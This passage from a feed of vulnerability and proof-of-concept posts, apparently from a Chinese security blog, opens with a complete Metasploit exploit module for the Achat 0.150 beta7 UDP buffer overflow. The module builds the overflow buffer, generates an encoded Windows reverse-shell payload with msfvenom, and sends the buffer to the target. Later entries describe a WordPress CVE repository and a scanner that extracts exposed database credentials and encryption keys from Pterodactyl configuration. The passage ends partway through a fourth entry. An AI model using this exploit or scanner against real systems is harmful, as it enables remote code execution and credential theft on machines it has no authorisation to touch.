class="hljs-comment"># This module requires Metasploit Framework</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Exploit Title: Achat 0.150 beta7 Buffer Overflow (UDP)</span><br><span class="hljs-comment"># CVE: CVE-2015-1578</span><br><span class="hljs-comment"># Date: Jun 20, 2025</span><br><span class="hljs-comment"># Exploit Author: yaldobaoth</span><br><span class="hljs-comment"># Vendor Homepage: http://achat.sourceforge.net/</span><br><span class="hljs-comment"># Software Link: http://sourceforge.net/projects/achat/</span><br><span class="hljs-comment"># Version: 0.150 beta7</span><br><span class="hljs-comment"># Tested on: Windows XP SP3 English</span><br><span class="hljs-comment"># Description:</span><br><span class="hljs-comment">#   This module exploits a buffer overflow in Achat 0.150 beta7.</span><br><span class="hljs-comment">#   The vulnerability is triggered via a crafted UDP packet, allowing</span><br><span class="hljs-comment">#   remote code execution. Payload is delivered as raw msfvenom shellcode</span><br><span class="hljs-comment">#   using windows/shell_reverse_tcp, encoded with x86/unicode_mixed.</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;English&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;msf/core&#x27;</span><br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Exploit for CVE-2015-1578 affecting Achat 0.150 beta.</span><br><span class="hljs-comment"># This module exploits a buffer overflow in the UDP message handler.</span><br><span class="hljs-comment"># Generates a custom msfvenom payload automatically due to internal encoding issues.</span><br><span class="hljs-comment">##</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">NormalRanking</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::Udp</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(update_info(info,<br>                      <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Achat UDP Buffer Overflow Exploit (Raw msfvenom Payload)&#x27;</span>,<br>                      <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">&#x27;</span><br><span class="hljs-string">        Exploits a buffer overflow in Achat via a crafted UDP packet.</span><br><span class="hljs-string">        Uses raw shellcode generated via msfvenom with windows/shell_reverse_tcp.</span><br><span class="hljs-string">      &#x27;</span>,<br>                      <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<span class="hljs-string">&#x27;YourName&#x27;</span>],<br>                      <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>                      <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;win&#x27;</span>],<br>                      <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [[<span class="hljs-string">&#x27;Universal&#x27;</span>, &#123;&#125;]],<br>                      <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>                      <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;Feb 08 2015&#x27;</span>,<br>                      <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>                        <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;windows/shell_reverse_tcp&#x27;</span><br>                      &#125;))<br><br>    register_options(<br>      [<br>        <span class="hljs-title class_">Opt</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:RHOSTS</span>,<br>        <span class="hljs-title class_">Opt</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:RPORT</span>(<span class="hljs-number">9256</span>),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;LHOST&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Local host for reverse shell&#x27;</span>]),<br>        <span class="hljs-title class_">OptInt</span>.new(<span class="hljs-string">&#x27;LPORT&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Local port for reverse shell&#x27;</span>, <span class="hljs-number">4444</span>])<br>      ]<br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_payload</span><br>    <span class="hljs-comment"># Get the actual payload module name string</span><br>    pl_name = datastore[<span class="hljs-string">&#x27;PAYLOAD&#x27;</span>]<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> pl_name != <span class="hljs-string">&#x27;windows/shell_reverse_tcp&#x27;</span><br><br>    print_warning(<br>      <span class="hljs-string">&#x27;This exploit module currently only supports&#x27;</span> \<br>      <span class="hljs-string">&quot;&#x27;windows/shell_reverse_tcp&#x27; payload, but you selected &#x27;<span class="hljs-subst">#&#123;pl_name&#125;</span>&#x27;.&quot;</span><br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment"># This module invokes msfvenom externally to generate shellcode on the fly.</span><br>  <span class="hljs-comment"># Reason: Metasploit&#x27;s internal payload generation and encoding frequently fails due to</span><br>  <span class="hljs-comment"># size constraints and bad character restrictions.</span><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-comment"># This ensures a properly encoded, size-constrained payload that reliably executes.</span><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-comment"># Note: Requires msfvenom to be in PATH. If missing or fails, the module will print an error.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload_raw</span><br>    lhost = datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>]<br>    lport = datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>].to_s<br><br>    print_status(<span class="hljs-string">&#x27;Generating payload with msfvenom...&#x27;</span>)<br><br>    badchars_bytes = (<span class="hljs-number">0x00</span>..<span class="hljs-number">0x00</span>).to_a + (<span class="hljs-number">0x80</span>..<span class="hljs-number">0xff</span>).to_a<br>    badchars_str = badchars_bytes.map &#123; |<span class="hljs-params">b</span>| format(<span class="hljs-string">&#x27;\\x%02x&#x27;</span>, b) &#125;.join<br>    badchars = <span class="hljs-string">&quot;&#x27;<span class="hljs-subst">#&#123;badchars_str&#125;</span>&#x27;&quot;</span><br><br>    cmd = [<br>      <span class="hljs-string">&#x27;msfvenom&#x27;</span>,<br>      <span class="hljs-string">&#x27;-a&#x27;</span>, <span class="hljs-string">&#x27;x86&#x27;</span>,<br>      <span class="hljs-string">&#x27;--platform&#x27;</span>, <span class="hljs-string">&#x27;Windows&#x27;</span>,<br>      <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;windows/shell_reverse_tcp&#x27;</span>,<br>      <span class="hljs-string">&quot;lhost=<span class="hljs-subst">#&#123;lhost&#125;</span>&quot;</span>,<br>      <span class="hljs-string">&quot;lport=<span class="hljs-subst">#&#123;lport&#125;</span>&quot;</span>,<br>      <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;x86/unicode_mixed&#x27;</span>,<br>      <span class="hljs-string">&#x27;-b&#x27;</span>, badchars,<br>      <span class="hljs-string">&#x27;BufferRegister=EAX&#x27;</span>,<br>      <span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;python&#x27;</span><br>    ]<br><br>    print_status(<span class="hljs-string">&#x27;Running msfvenom command:&#x27;</span>)<br>    print_line(cmd.join(<span class="hljs-string">&#x27; &#x27;</span>))<br><br>    output = <span class="hljs-string">`<span class="hljs-subst">#&#123;cmd.join(<span class="hljs-string">&#x27; &#x27;</span>)&#125;</span> 2&gt;&amp;1`</span><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:BadConfig</span>, <span class="hljs-string">&quot;msfvenom failed:\n<span class="hljs-subst">#&#123;output&#125;</span>&quot;</span>) <span class="hljs-keyword">unless</span> <span class="hljs-variable">$CHILD_STATUS</span>.success?<br><br>    raw = <span class="hljs-title class_">String</span>.new<br>    output.each_line <span class="hljs-keyword">do</span> |<span class="hljs-params">line</span>|<br>      raw &lt;&lt; line.scan(<span class="hljs-regexp">/\\x[0-9a-fA-F]&#123;2&#125;/</span>).map &#123; |<span class="hljs-params">hx</span>| hx[<span class="hljs-number">2</span>..].to_i(<span class="hljs-number">16</span>).chr &#125;.join <span class="hljs-keyword">if</span> line.strip.start_with?(<span class="hljs-string">&#x27;buf +=&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br><br>    print_good(<span class="hljs-string">&quot;Payload generated (<span class="hljs-subst">#&#123;raw.bytesize&#125;</span> bytes)&quot;</span>)<br>    raw<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    validate_payload<br><br>    connect_udp<br><br>    shellcode = generate_payload_raw<br><br>    print_status(<span class="hljs-string">&#x27;Building final buffer...&#x27;</span>)<br>    fs = <span class="hljs-string">&quot;\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39&quot;</span><br>    p  = <span class="hljs-string">&quot;A0000000002#Main\u0000<span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;Z&#x27;</span> * <span class="hljs-number">114_688</span>&#125;</span>\u0000<span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">10</span>&#125;</span>\u0000&quot;</span><br>    p += <span class="hljs-string">&quot;A0000000002#Main\u0000<span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">57_288</span>&#125;</span><span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;AAAAASI&#x27;</span> * <span class="hljs-number">50</span>&#125;</span><span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">3750</span> - <span class="hljs-number">46</span>)&#125;</span>&quot;</span><br>    p += <span class="hljs-string">&quot;b<span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">45</span>&#125;</span>&quot;</span><br>    p += <span class="hljs-string">&quot;\x61\x40&quot;</span><br>    p += <span class="hljs-string">&quot;\x2A\x46&quot;</span><br>    p += <span class="hljs-string">&quot;CUnXn**\u0005\u0014\u0011C-\u0013\u0011CPC]<span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">9</span>&#125;</span>`C&quot;</span><br>    p += <span class="hljs-string">&#x27;aC*F&#x27;</span><br>    p += <span class="hljs-string">&quot;*<span class="hljs-subst">#&#123;fs&#125;</span><span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;C&#x27;</span> * (<span class="hljs-number">157</span> - fs.bytesize - <span class="hljs-number">31</span> - <span class="hljs-number">3</span>)&#125;</span>&quot;</span><br>    p += shellcode + <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">1152</span> - shellcode.bytesize)<br>    p += <span class="hljs-string">&quot;\u0000<span class="hljs-subst">#&#123;<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">10</span>&#125;</span>\u0000&quot;</span><br><br>    print_status(<span class="hljs-string">&quot;Sending payload to <span class="hljs-subst">#&#123;rhost&#125;</span>:<span class="hljs-subst">#&#123;rport&#125;</span>...&quot;</span>)<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; p.bytesize<br>      udp_sock.put(p[i, <span class="hljs-number">8192</span>])<br>      i += <span class="hljs-number">8192</span><br>      <span class="hljs-title class_">Rex</span>.sleep(<span class="hljs-number">0.01</span>) <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">172_000</span><br>    <span class="hljs-keyword">end</span><br><br>    print_good(<span class="hljs-string">&#x27;Payload sent. If all went well, you should get a shell back.&#x27;</span>)<br>    disconnect_udp<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Achat 0.150 beta7 Buffer Overflow Vulne</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>WordPress CVE-2024-10924 渗透测试</title>
    <link href="http://example.com/2025/06/25/github_3526819257/"/>
    <id>http://example.com/2025/06/25/github_3526819257/</id>
    <published>2025-06-25T19:15:29.579Z</published>
    <updated>2025-06-25T19:15:29.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WordPress CVE-2024-10924 渗透测试</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-10924</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> WordPress CVE-2024-10924 渗透测试相关资源。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> WordPress</p><p><strong>来源：</strong> <a href="https://github.com/ademto/wordpress-cve-2024-10924-pentest">https://github.com/ademto/wordpress-cve-2024-10924-pentest</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; WordPress CVE-2024-10924 渗透测试&lt;/p&gt;
&lt;p&gt;&lt;s</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-49132 Standalone Vulnerability Scanner</title>
    <link href="http://example.com/2025/06/25/github_1524724713/"/>
    <id>http://example.com/2025/06/25/github_1524724713/</id>
    <published>2025-06-25T18:45:16.656Z</published>
    <updated>2025-06-25T18:45:16.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-49132 Standalone Vulnerability Scanner</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49132</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-49132 Standalone Vulnerability Scanner是一个无需Docker依赖的Python实现的漏洞扫描工具，能够检测数据库配置暴露、应用配置、加密密钥和环境变量等敏感信息泄露。该工具支持单目标扫描、批量处理、交互模式等多种执行方式，并生成结构化的JSON格式输出。技术特点包括跨平台兼容性、实时扫描进度监控、异常管理和安全警报等。</p><p><strong>来源：</strong> <a href="https://github.com/melonlonmeo/CVE-2025-49132">https://github.com/melonlonmeo/CVE-2025-49132</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>requirements-standalone.txt</li><li>standalone_scanner.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49132-Standalone-Vulnerability-Scanner"><a href="#CVE-2025-49132-Standalone-Vulnerability-Scanner" class="headerlink" title="CVE-2025-49132 Standalone Vulnerability Scanner"></a>CVE-2025-49132 Standalone Vulnerability Scanner</h2><h3 id="Non-Docker-Implementation"><a href="#Non-Docker-Implementation" class="headerlink" title="Non-Docker Implementation"></a>Non-Docker Implementation</h3><p>This scanner operates directly on Python without Docker dependencies, suitable for environments where Docker is not available or preferred.</p><h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install -r requirements-standalone.txt<br></code></pre></td></tr></table></figure><p>Manual installation:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install requests urllib3<br></code></pre></td></tr></table></figure><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="1-Single-Target-Scanning"><a href="#1-Single-Target-Scanning" class="headerlink" title="1. Single Target Scanning"></a>1. Single Target Scanning</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python standalone_scanner.py scan http://localhost/<br></code></pre></td></tr></table></figure><h4 id="2-Batch-Scanning-from-File"><a href="#2-Batch-Scanning-from-File" class="headerlink" title="2. Batch Scanning from File"></a>2. Batch Scanning from File</h4><p>Create <code>targets.txt</code>:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//localhost/</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//localhost:8080</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//localhost:3000</span><br></code></pre></td></tr></table></figure><p>Execute batch scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python standalone_scanner.py batch --file targets.txt<br></code></pre></td></tr></table></figure><h4 id="3-Output-Persistence"><a href="#3-Output-Persistence" class="headerlink" title="3. Output Persistence"></a>3. Output Persistence</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python standalone_scanner.py batch --file targets.txt --output results.json<br></code></pre></td></tr></table></figure><h4 id="4-Interactive-Mode"><a href="#4-Interactive-Mode" class="headerlink" title="4. Interactive Mode"></a>4. Interactive Mode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python standalone_scanner.py interactive<br></code></pre></td></tr></table></figure><h3 id="Output-Examples"><a href="#Output-Examples" class="headerlink" title="Output Examples"></a>Output Examples</h3><h4 id="Vulnerable-Target"><a href="#Vulnerable-Target" class="headerlink" title="Vulnerable Target:"></a>Vulnerable Target:</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nix">🔍 <span class="hljs-params">Scanning:</span> http:<span class="hljs-operator">//</span>localhost<span class="hljs-symbol">/</span><br>⏰ <span class="hljs-params">Time:</span> <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>1-<span class="hljs-number">27</span> <span class="hljs-number">15</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span><br><span class="hljs-operator">-</span>-----------------------------------------------------------<br>✅ VULNERABLE <span class="hljs-operator">-</span> Database credentials found<span class="hljs-operator">!</span><br>📊 Database <span class="hljs-params">Info:</span><br>   <span class="hljs-params">Host:</span> localhost<br>   <span class="hljs-params">Port:</span> <span class="hljs-number">3306</span><br>   <span class="hljs-params">Database:</span> root<br>   <span class="hljs-params">Username:</span> root<br>   <span class="hljs-params">Password:</span> secret123<br>🔗 Connection <span class="hljs-params">String:</span> root:secret123@localhost:<span class="hljs-number">3306</span><span class="hljs-symbol">/root</span><br><br>✅ VULNERABLE <span class="hljs-operator">-</span> App configuration found<span class="hljs-operator">!</span><br>📊 App <span class="hljs-params">Config:</span><br>   App <span class="hljs-params">Key:</span> base64:your_secret_key_here<br>   <span class="hljs-params">Cipher:</span> AES-<span class="hljs-number">25</span>6-CBC<br>   <span class="hljs-params">Debug:</span> <span class="hljs-literal">false</span><br>   <span class="hljs-params">Environment:</span> production<br>   App <span class="hljs-params">Name:</span> Pterodactyl<br>   App <span class="hljs-params">URL:</span> http:<span class="hljs-symbol">//localhost</span><br>   <span class="hljs-params">Timezone:</span> UTC<br>   <span class="hljs-params">Locale:</span> en<br><br>🔔 SECURITY <span class="hljs-params">WARNING:</span> APP_KEY exposed<span class="hljs-operator">!</span><br>   This key is used for encryption<span class="hljs-symbol">/decryption</span><br>   Can be used to decrypt sensitive data<br></code></pre></td></tr></table></figure><h4 id="Safe-Target"><a href="#Safe-Target" class="headerlink" title="Safe Target:"></a>Safe Target:</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">🔍 Scanning: http://localhost/<br><span class="hljs-section">⏰ Time: 2025-01-27 15:30:45</span><br><span class="hljs-section">------------------------------------------------------------</span><br>❌ NOT VULNERABLE (Status: 404)<br></code></pre></td></tr></table></figure><h3 id="Technical-Features"><a href="#Technical-Features" class="headerlink" title="Technical Features"></a>Technical Features</h3><ul><li>✅ <strong>Docker-free Operation</strong>: Direct Python execution</li><li>✅ <strong>Cross-platform Compatibility</strong>: Windows, Linux, macOS</li><li>✅ <strong>Multiple Execution Modes</strong>: Single target, batch processing, interactive</li><li>✅ <strong>Structured Output</strong>: JSON format for data persistence</li><li>✅ <strong>Robust Error Handling</strong>: Comprehensive exception management</li><li>✅ <strong>Progress Monitoring</strong>: Real-time scanning progress</li><li>✅ <strong>Analytical Reports</strong>: Statistical summary generation</li><li>✅ <strong>Cryptographic Detection</strong>: APP_KEY and cipher identification</li><li>✅ <strong>Security Alerts</strong>: Automated vulnerability notifications</li></ul><h3 id="Comparative-Analysis"><a href="#Comparative-Analysis" class="headerlink" title="Comparative Analysis"></a>Comparative Analysis</h3><table><thead><tr><th>Feature</th><th>Standalone</th><th>Container</th></tr></thead><tbody><tr><td>Setup Complexity</td><td>Minimal</td><td>Docker-dependent</td></tr><tr><td>Dependencies</td><td>Python packages</td><td>Docker + Python</td></tr><tr><td>Performance</td><td>Optimized</td><td>Comparable</td></tr><tr><td>Process Isolation</td><td>None</td><td>Full isolation</td></tr><tr><td>Deployment Portability</td><td>High</td><td>Medium</td></tr></tbody></table><h3 id="Technical-Specifications"><a href="#Technical-Specifications" class="headerlink" title="Technical Specifications"></a>Technical Specifications</h3><h4 id="Network-Configuration"><a href="#Network-Configuration" class="headerlink" title="Network Configuration"></a>Network Configuration</h4><ul><li><strong>Timeout</strong>: 10 seconds (configurable)</li><li><strong>SSL Verification</strong>: Disabled for compatibility</li><li><strong>User-Agent</strong>: Standard browser simulation</li><li><strong>Request Method</strong>: GET only (non-intrusive)</li></ul><h4 id="Vulnerability-Detection"><a href="#Vulnerability-Detection" class="headerlink" title="Vulnerability Detection"></a>Vulnerability Detection</h4><ul><li><strong>Database Configuration Exposure</strong>: MySQL&#x2F;PostgreSQL credentials</li><li><strong>Application Configuration</strong>: Laravel&#x2F;PHP settings</li><li><strong>Cryptographic Keys</strong>: APP_KEY identification</li><li><strong>Environment Variables</strong>: Production&#x2F;development settings</li></ul><h3 id="Troubleshooting"><a href="#Troubleshooting" class="headerlink" title="Troubleshooting"></a>Troubleshooting</h3><h4 id="Module-Import-Errors"><a href="#Module-Import-Errors" class="headerlink" title="Module Import Errors:"></a>Module Import Errors:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install requests<br></code></pre></td></tr></table></figure><h4 id="SSL-Certificate-Issues"><a href="#SSL-Certificate-Issues" class="headerlink" title="SSL Certificate Issues:"></a>SSL Certificate Issues:</h4><p>SSL warnings are automatically suppressed. No additional configuration required.</p><h4 id="Connection-Timeout"><a href="#Connection-Timeout" class="headerlink" title="Connection Timeout:"></a>Connection Timeout:</h4><p>Default timeout is 10 seconds. Modify <code>timeout</code> parameter in source code if needed.</p><h3 id="Security-Considerations"><a href="#Security-Considerations" class="headerlink" title="Security Considerations"></a>Security Considerations</h3><h4 id="Scanner-Behavior"><a href="#Scanner-Behavior" class="headerlink" title="Scanner Behavior"></a>Scanner Behavior</h4><ul><li><strong>Non-intrusive</strong>: Only performs GET requests</li><li><strong>Data Handling</strong>: No sensitive data persistence</li><li><strong>Detection Scope</strong>: Configuration file exposure</li><li><strong>Exploitation</strong>: No active exploitation performed</li></ul><h4 id="Risk-Assessment"><a href="#Risk-Assessment" class="headerlink" title="Risk Assessment"></a>Risk Assessment</h4><ul><li><strong>Database Credentials</strong>: Direct database access potential</li><li><strong>Application Keys</strong>: Encryption&#x2F;decryption capability exposure</li><li><strong>Environment Variables</strong>: Configuration disclosure</li><li><strong>Attack Surface</strong>: Increased vulnerability footprint</li></ul><h3 id="Quick-Start-Guide"><a href="#Quick-Start-Guide" class="headerlink" title="Quick Start Guide"></a>Quick Start Guide</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## Install dependencies</span><br>pip install requests urllib3<br><br><span class="hljs-comment">## Perform test scan</span><br>python standalone_scanner.py scan http://localhost/<br><br><span class="hljs-comment">## Execute batch analysis</span><br>python standalone_scanner.py batch --file targets.txt --output results.json<br></code></pre></td></tr></table></figure><h3 id="Technical-Architecture"><a href="#Technical-Architecture" class="headerlink" title="Technical Architecture"></a>Technical Architecture</h3><h4 id="Core-Components"><a href="#Core-Components" class="headerlink" title="Core Components"></a>Core Components</h4><ol><li><strong>Scanner Engine</strong>: HTTP request processing</li><li><strong>Parser Module</strong>: Response analysis and extraction</li><li><strong>Vulnerability Detector</strong>: Pattern matching and validation</li><li><strong>Output Formatter</strong>: Structured data presentation</li><li><strong>Error Handler</strong>: Exception management and recovery</li></ol><h4 id="Data-Flow"><a href="#Data-Flow" class="headerlink" title="Data Flow"></a>Data Flow</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">Target <span class="hljs-keyword">Input</span> → HTTP Request → Response Analysis → Vulnerability Detection → <span class="hljs-keyword">Output</span> Generation<br></code></pre></td></tr></table></figure><h3 id="Performance-Metrics"><a href="#Performance-Metrics" class="headerlink" title="Performance Metrics"></a>Performance Metrics</h3><ul><li><strong>Scan Speed</strong>: ~1-3 seconds per target</li><li><strong>Memory Usage</strong>: Minimal footprint</li><li><strong>Network Overhead</strong>: Single GET request per target</li><li><strong>CPU Utilization</strong>: Low computational requirements</li></ul><h3 id="Compliance-and-Ethics"><a href="#Compliance-and-Ethics" class="headerlink" title="Compliance and Ethics"></a>Compliance and Ethics</h3><p>This tool is designed for:</p><ul><li><strong>Security Research</strong>: Vulnerability assessment</li><li><strong>Penetration Testing</strong>: Authorized security testing</li><li><strong>Educational Purposes</strong>: Security awareness training</li><li><strong>Compliance Auditing</strong>: Security posture evaluation</li></ul><p><strong>Note</strong>: Always obtain proper authorization before scanning any target systems.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-49132 Standalone Vulnerability</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>SourceCodester Online Student Clearance System 10 文件上传漏洞</title>
    <link href="http://example.com/2025/06/25/github_2558243243/"/>
    <id>http://example.com/2025/06/25/github_2558243243/</id>
    <published>2025-06-25T18:15:15.248Z</published>
    <updated>2025-06-25T18:15:15.248Z</updated>
    
